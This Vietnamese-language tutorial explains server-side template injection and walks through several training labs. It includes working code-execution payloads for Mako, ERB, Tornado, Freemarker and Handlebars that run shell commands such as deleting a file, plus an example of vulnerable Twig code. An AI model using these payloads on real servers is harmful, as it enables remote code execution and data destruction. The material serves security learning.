# **Server-side template injection**

## **Server-side template injection là gì?**

- SSTI là khi kẻ tấn công có thể biết ngôn ngữ gốc của web và thực hiện tiêm payload sau đó được thực thi bên phía máy chủ.

- Các cuộc tấn công SSTI được xảy ra khi đầu vào được chèn trực tiếp vào mẫu, thay vì được chuyển dưới dạng dữ liệu.

## **Server-side template injection phát sinh như thế nào?**

- Các mẫu chỉ đơn giản là các chuỗi, các nhà phát triển web đôi khi trực tiếp nối đầu vào của người dùng vào các mẫu trước khi kết xuất. Hãy lấy một ví dụ tương tự như ví dụ trên, nhưng lần này, người dùng có thể tùy chỉnh các phần của email trước khi gửi. Ví dụ: họ có thể chọn tên được sử dụng:

```
$output = $twig->render("Dear " . $_GET['name']);
```

- Điều này cho phép kẻ tấn có thể tấn công như sau:

```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```

## **Xây dựng cuộc tấn công Server-side template injection**

![](./img_ssti/1.png)

### **Detect**

- Để phát hiện lỗ hổng một cách đơn giản nhất là chúng ta thử các kí tự đặc biệt: `${{<%[%'"}}%\`

> **Plaintext context**

- Hầu hết các ngôn ngữ đều hỗ trợ ngữ cảnh 'văn bản' dạng tự do nơi bạn có thể nhập trực tiếp HTML. Nó thường sẽ xuất hiện theo một trong các cách sau:

```
smarty=Hello {user.name}
Hello user1 
```

```
smarty=Hello ${7*7}
Hello 49

freemarker=Hello ${7*7}
Hello 49

```

> **Code context**

- Đầu vào của người dùng cũng có thể được đặt trong một câu lệnh mẫu, thường là tên biến:

```
personal_greeting=username
Hello user01 
```

- Các biến thể này thậm chí còn dễ bị bỏ sót hơn trong quá trình đánh giá. Chúng ta có thể phát hiện như sau:

```
personal_greeting=username<tag>
Hello 

personal_greeting=username}}<tag>
Hello user01 <tag> 
```

### **Identify**

- Sau khi phát hiện `template injection`, bước tiếp theo là xác định ngôn ngữ và mẫu đang sử dụng. Chúng ta có thể tự động hóa việc này trong Burpsuite.

![](./img_ssti/2.png)

### **Exploit**

> **Read**

- Bước đầu tiên sau khi tìm kiếm mẫu tiêm và xác định công cụ mẫu là đọc tài liệu. Không nên đánh giá thấp tầm quan trọng của bước này, một trong những khai thác zeroday để làm theo được bắt nguồn hoàn toàn từ việc nghiên cứu kỹ tài liệu. Các tài liệu quan tâm chính là:
  - Cú pháp
  - Danh sách phương thức, hàm, bộ lọc
  - Các extensions/plugins

> **Explore**

- Giả sử không tìm thấy cách khai thác nào, thì chúng ta nên khám phá môi trường để tìm ra chính xác những gì bạn có quyền truy cập,

> **Attack**

- Tại thời điểm này, bạn nên có ý tưởng chắc chắn về bề mặt tấn công có sẵn cho mình và có thể tiến hành các kỹ thuật kiểm tra bảo mật truyền thống, xem xét từng chức năng để tìm các lỗ hổng có thể khai thác. Điều quan trọng là phải tiếp cận điều này trong ngữ cảnh của ứng dụng rộng hơn - một số chức năng có thể được sử dụng để khai thác các tính năng dành riêng cho ứng dụng.

## **Thực hành một số bài LAB tấn công Server-side template injection**

> ### **Learn the basic template syntax**

- Học cú pháp cơ bản rõ ràng là quan trọng, cùng với các chức năng chính và xử lý các biến. Ngay cả những việc đơn giản như học cách nhúng các khối mã gốc vào mẫu đôi khi cũng có thể nhanh chóng dẫn đến việc khai thác. Ví dụ: khi bạn biết rằng công cụ mẫu Mako dựa trên Python đang được sử dụng, việc thực thi mã từ xa có thể đơn giản như sau:

```
<%
    import os
    x=os.popen('id').read()
    %>
    ${x}
```

> **Lab: Basic server-side template injection**

- Ở phòng thí nghiệm này dễ bị template injection do cấu trúc template ERB không an toàn. Để giải quyết vấn đề trong phòng thí nghiệm, hãy xem lại tài liệu ERB để tìm hiểu cách thực thi mã tùy ý, sau đó xóa tệp Morale.txt khỏi thư mục chính Carlos.

![](./img_ssti/3.png)

- Khi tôi thực hiện truy cập vào sản phẩm `There is No 'I' in Team` thì nó hiện tin nhắn `Unfortunately this product is out of stock`

![](./img_ssti/4.png)

- Sau khi tôi đọc tài liệu về [ERB Document](https://docs.ruby-lang.org/en/2.3.0/ERB.html) nó được code bằng Ruby. Tôi đã thử một số thử nghiệm.

![](./img_ssti/5.png)

- Từ đấy, ta biết được chúng ta có thể thực hiện tấn công SSTI. Tôi đã thử ra làm thế nào có thể thực thi lệnh trong hệ điều hành bằng Ruby. Và tôi đã hoàn thành được yêu cầu bài toán.

```
<%= system("rm /home/carlos/morale.txt") %>

```

> **Lab: Basic server-side template injection (code context)**

- Yêu cầu bài ra như sau: Để giải quyết vấn đề trong phòng thí nghiệm, hãy xem lại tài liệu Tornado để khám phá cách thực thi mã tùy ý, sau đó xóa tệp Morale.txt khỏi thư mục chính của Carlos.

- Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: wiener:peter

- Ở trang website có chức năng `Preferred name`. Chức năng này có tác dụng chọn lựa tên yêu thích khi bạn bình luận trên sản phẩm, thì bình luận của mình sẽ hiện tên yêu thích của mình.

![](./img_ssti/6.png)

- Sau khi đọc về [tài liệu Tornado](https://www.tornadoweb.org/en/stable/template.html) tôi đã thử tấn công template injection.

```
{% import os %}
{{os.system('rm /home/carlos/morale.txt')
```

> **Lab: Server-side template injection using documentation**

- Để giải quyết vấn đề trong phòng thí nghiệm, hãy xác định công cụ mẫu và sử dụng tài liệu để tìm ra cách thực thi mã tùy ý, sau đó xóa tệp Morale.txt khỏi thư mục chính của Carlos.

- Bạn có thể đăng nhập vào tài khoản của riêng mình bằng thông tin đăng nhập sau:

```
content-manager:C0nt3ntM4n4g3r
```

- Sau khi chúng ta đăng nhập vào tài khoản trên chúng ta thấy có chức năng edit templates như sau:

![](./img_ssti/7.png)

- Ta thấy nó đã sử dụng template `<p>Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.</p>`

- Sau khi tôi tìm hiểu trang web đã được sử dụng `Freemarker - Basic injection`

![](./img_ssti/10.png)

- [**Freemarker**](https://freemarker.apache.org/docs/dgui_datamodel_types.html)

- Tôi đã thử một số injection như sau:
  - Default: ${3*3}
  - Legacy: #{3*3}
  - Alternative: [=3*3]

![](./img_ssti/8.png)

- Sau khi tôi tìm hiểu, tôi có thể thực thi xóa file như sau:

`<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm /home/carlos/morale.txt")}`

![](./img_ssti/9.png)

> **Lab: Server-side template injection in an unknown language with a documented exploit**

- Để giải quyết phòng thí nghiệm, xác định công cụ mẫu và tìm cách khai thác được ghi lại trực tuyến mà bạn có thể sử dụng để thực thi mã tùy ý, sau đó xóa tệp Morale.txt khỏi thư mục chính của Carlos

- Khi tôi injection một template không hợp lệ nó sẽ hiện thông báo lỗi và từ đó tôi biết trang web sử dụng tempplate nào.

![](./img_ssti/11.png)

- Trang web đã dùng `node_modules/handlebars`

- Tôi đã đọc một bài blog sau [**Blog**](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

```
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```
